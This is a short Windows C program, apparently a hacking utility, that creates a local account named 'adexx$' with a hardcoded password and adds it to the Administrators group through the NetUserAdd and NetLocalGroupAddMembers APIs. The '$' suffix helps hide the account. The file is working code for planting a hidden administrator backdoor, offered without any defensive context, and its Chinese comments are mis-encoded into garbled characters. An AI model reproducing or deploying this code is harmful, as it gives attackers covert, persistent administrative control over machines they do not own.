#ifndef UNICODE
#define UNICODE
#endif
#include <stdio.h>
#include <windows.h>
#include <lm.h>
#pragma comment(lib, "netapi32")
int wmain(int argc, wchar_t *argv[])
{
    // ����USER_INFO_1�ṹ��
    USER_INFO_1 ui;
    DWORD dwError = 0;
    //С�ʼ� LPWSTR �� wchar_t *   �� L"zzzhh" ������const wchar_t[6] ������ʽת��Ϊconst whcar_t *
    wchar_t username[] = L"adexx$";
    ui.usri1_name = username; // �˻�
    wchar_t password[] = L"adexx!@#QWE";
    ui.usri1_password = password; // ����
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;
    //������Ϊadexx���û�,����Ϊp@adexx!@#QWE
    if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
    {

        MessageBox(0, L"successfully", L"title", 0);
    }
    else
    {
        //����ʧ��
        MessageBox(0, L"fail", L"title", 0);
    }

    // �����û���administrators��
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = ui.usri1_name;
    if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
    {
        //���ӳɹ�
        MessageBox(0, L"Add to Administrators success", L"title", 0);
    }
    else
    {
        //����ʧ��
        MessageBox(0, L"Add to Administrators Fail!", L"title", 0);
    }

    return 0;
}